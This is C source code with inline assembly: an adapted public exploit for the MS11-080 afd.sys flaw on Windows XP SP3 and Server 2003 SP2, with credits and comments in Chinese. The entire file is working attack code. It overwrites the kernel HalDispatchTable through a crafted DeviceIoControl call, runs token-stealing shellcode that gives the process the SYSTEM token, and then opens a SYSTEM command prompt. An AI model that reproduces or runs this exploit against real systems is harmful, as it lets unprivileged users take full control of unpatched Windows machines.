/*
 * MS11-080 Afd.sys Privilege Escalation Exploit
 * 来源：Matteo Memelli，http://www.exploit-db.com/exploits/18176/
 * 改编：KiDebug，Google@pku.edu.cn
 * 编译：VC6.0
 * 测试环境：原版Windows XP SP3，Windows 2003 SP2，普通用户
 */
#include <stdio.h>
#include <Winsock2.h>
#include <windows.h>
#pragma comment (lib, "ws2_32.lib")
 
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;                 // Not filled in
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[ 256 ];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;
 
typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
 
typedef ULONG ( __stdcall *NtQueryIntervalProfile_ ) ( ULONG, PULONG );
typedef ULONG ( __stdcall *NtQuerySystemInformation_ ) ( ULONG, PVOID, ULONG, PULONG );
typedef ULONG ( __stdcall *NtAllocateVirtualMemory_ ) ( HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG );
NtQueryIntervalProfile_ NtQueryIntervalProfile;
NtAllocateVirtualMemory_ NtAllocateVirtualMemory;
NtQuerySystemInformation_ NtQuerySystemInformation;
 
ULONG    PsInitialSystemProcess, PsReferencePrimaryToken, PsGetThreadProcess, WriteToHalDispatchTable;
 
void _declspec(naked) ShellCode()
{
    __asm
    {
        pushad
        pushfd
        mov esi,PsReferencePrimaryToken
FindTokenOffset:
        lodsb
        cmp al, 8Dh;
        jnz FindTokenOffset
        mov edi,[esi+1]
        mov esi,PsInitialSystemProcess
        mov esi,[esi]
        push fs:[124h]
        mov eax,PsGetThreadProcess
        call eax
        add esi, edi
        add edi, eax
        movsd
        popfd
        popad
        ret
    }
}
 
 
 
void main( )
{
    HMODULE ntdll               =   GetModuleHandle( "ntdll.dll" );
    NtQueryIntervalProfile      =   (NtQueryIntervalProfile_)GetProcAddress( ntdll ,"NtQueryIntervalProfile" );
    NtAllocateVirtualMemory     =   (NtAllocateVirtualMemory_)GetProcAddress( ntdll ,"NtAllocateVirtualMemory" );
    NtQuerySystemInformation    =   ( NtQuerySystemInformation_ )GetProcAddress( ntdll ,"NtQuerySystemInformation" );
    if ( NtQueryIntervalProfile == NULL || NtAllocateVirtualMemory == NULL || NtQuerySystemInformation == NULL )
        return;
 
    ULONG    BaseAddress = 1 , RegionSize = 0x1000, status;
    status = NtAllocateVirtualMemory( (HANDLE)0xFFFFFFFF, (PVOID*)&BaseAddress, 0, &RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    if ( status )
        return;
 
    //取ntoskrnl的信息，只要调用一次就行
    ULONG   NtoskrnlBase;
    RTL_PROCESS_MODULES module;
    status = NtQuerySystemInformation( 11, &module, sizeof(RTL_PROCESS_MODULES), NULL);//SystemModuleInformation 11
    if ( status != 0xC0000004 )    //STATUS_INFO_LENGTH_MISMATCH
        return;
 
    NtoskrnlBase    =   (ULONG)module.Modules[0].ImageBase;
 
    //把ntoskrnl.exe加载进来
    HMODULE     ntoskrnl;
    ntoskrnl    =    LoadLibraryA( (LPCSTR)( module.Modules[0].FullPathName + module.Modules[0].OffsetToFileName ) );
    if ( ntoskrnl == NULL )
        return;
 
    //计算实际地址
    WriteToHalDispatchTable     =   (ULONG)GetProcAddress(ntoskrnl,"HalDispatchTable") - (ULONG)ntoskrnl + NtoskrnlBase + 4 + 2; //需要覆盖的地址
    PsInitialSystemProcess      =   (ULONG)GetProcAddress(ntoskrnl,"PsInitialSystemProcess") - (ULONG)ntoskrnl + NtoskrnlBase;
    PsReferencePrimaryToken     =   (ULONG)GetProcAddress(ntoskrnl,"PsReferencePrimaryToken") - (ULONG)ntoskrnl + NtoskrnlBase;
    PsGetThreadProcess          =   (ULONG)GetProcAddress(ntoskrnl,"PsGetThreadProcess") - (ULONG)ntoskrnl + NtoskrnlBase;
     
    //以下代码就各显神通了
    if ( VirtualAlloc( (PVOID)0x02070000, 0x20000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE ) == NULL )
        return;
 
    memset((PVOID)0x02070000,0x90,0x20000);
    memcpy((PVOID)0x02080000,ShellCode,100);
 
 
    WSADATA ws;
 
    SOCKET tcp_socket;
    struct sockaddr_in peer;
    ULONG  dwReturnSize;
 
    WSAStartup(0x0202,&ws);
 
    peer.sin_family = AF_INET;
    peer.sin_port = htons(4455);
    peer.sin_addr.s_addr = inet_addr( "127.0.0.1" );
 
    tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
    if ( connect(tcp_socket, (struct sockaddr*) &peer, sizeof(struct sockaddr_in)) )
    {
        printf("connect error\n");
    }
 
    UCHAR   buf1[26]= "\x41\x41\x41\x41\x42\x42\x42\x42\x00\x00\x00\x00\x44\x44\x44\x44\x01\x00\x00\x00\xe8\x00\x34\xf0\x00";
    memset((PVOID)0x1000,0x45,0x108);
    memcpy((PVOID)0x1000,buf1,25);
     
    if(!DeviceIoControl((HANDLE)tcp_socket,0x000120bb, (PVOID)0x1004, 0x108, (PVOID)WriteToHalDispatchTable, 0x0,&dwReturnSize, NULL))
    {
        printf("error=%d\n", GetLastError());
    }
 
    //触发，弹出SYSTEM的CMD
    NtQueryIntervalProfile( 2, &status );
    ShellExecute( NULL, "open", "cmd.exe", NULL, NULL, SW_SHOW);
    return;
}

